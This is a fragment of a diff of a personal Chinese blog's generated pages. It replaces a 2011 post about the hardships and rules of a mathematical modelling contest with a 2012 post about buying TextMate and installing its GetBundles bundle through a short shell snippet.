-		<p>为了这个数学建模啊，奋斗了3天，第一天是1点睡的，第二天4点睡的，第三天也是4点睡的，每天都是早上8点左右起来。稍微有点短，快要接近高中的生活，长时间没熬夜，突然一熬还真受不了，第二天我的两个同学可能要比我辛苦一些，我是感觉很累就去睡了，还是她们叫我起来。</p>
+		<p>截至目前，这是我买得最贵的一款软件了——39欧元（327RMB）</p>
 
-<p>哎，计算机系的同学搞数学建模真得很痛苦，痛苦的主要来源是很多东西根本不了解，而且短时间根本学不会，是一种无奈，看着时间一点点过去自己却什么都做不了，就这样不断打击自己的信心，人们就这样被击垮了：（</p>
+<p>一直在豆瓣Textmate小组中等人家团购，自己也从没在官网试过购买，一看是用的paypal做中转，感觉不靠谱，以前也没试过paypal的支付，没想到这次成功了，先用了张信用卡支付，发现不行，结果换普通银行卡，直接跳转到了银联，然后我又用的信用卡透支……</p>
 
-<p>加了两个建模的讨论群，里面大多数（超过99%）人在要答案，很少有人是讨论的，而且即便是这样，我记得参赛时有个比赛注意事项——比赛期间不得与他人探讨，包括指导老师——这简直是不可能，我看到后都感觉新鲜，暂且不说和他人讨论，不能和指导老师讨论，都让我感觉不可思议，我反复读了几遍《承诺书》，确定了有这样一句——“<strong>我们完全明白，在竞赛开始后参赛队员不能以任何方式（包括电话、电子邮件、网上咨询等）与队外的任何人（包括指导教师）研究、讨论与赛题有关的问题。</strong>”有指导老师的一般都是指导老师在奋斗呢，怎么不能够讨论呢？！反正承诺书就这么写的，而且还是第一条。还好我们没有指导老师，只能全靠自己来做，可能做得不如别人的好，但至少不会感觉胆怯，我们也不会太敬佩夺得一二等奖的队伍，因为我们都明白这其中有多少代表了你们自己的能力，如果是你们自己完成的，那我们会佩服，可惜这样的队伍很少见，我只好当作没有了：（</p>
+<p>稍微配置了一下textmate，按照<a href="http://www.lixiaolai.com/archives/10895.html">这里</a>的方法，其中1.5版本的中文字体那里，建议不要尝试了，不完美，还是等2.0正式发布了吧，听说2.0对于中文字体支持得很好，但我懒得下载测试版来用：）</p>
+
+<p>加入GetBundles：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">mkdir -p ~/Library/Application\ Support/TextMate/Bundles
+cd !$
+svn co http://svn.textmate.org/trunk/Review/Bundles/GetBundles.tmbundle/
+osascript -e 'tell app "TextMate" to reload bundles'</pre>
+
+
+<p>第一次见cd还能这样用，这样简直太方便了！还有最后那句script，多么优美的句子：）</p>
+
+<p>以后就要多用textmate了，先放弃emacs。</p>
 
 		
 		
@@ -501,11 +881,11 @@ Oct  4 12:54:35 wodeyitian pptpd[1615]: CTRL: Client 112.227.24.59 control conne
   
 
 
-<time datetime="2011-09-12T18:17:00+08:00" pubdate data-updated="true">Sep 12<span>th</span>, 2011</time></div>
+<time datetime="2012-02-23T19:29:00+08:00" pubdate data-updated="true">Feb 23<span>rd</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/shu-xue-jian-mo/'>数学建模</a>, <a class='category' href='/blog/categories/ji-lu-wo-can-jia-shu-xue-jian-mo-de-shi-qing/'>记录我参加数学建模的事情</a>
+	<a class='category' href='/blog/categories/macxi-tong-zhong-de-shi-yong-ji-qiao/'>Mac系统中的使用技巧</a>, <a class='category' href='/blog/categories/textmate/'>textmate</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
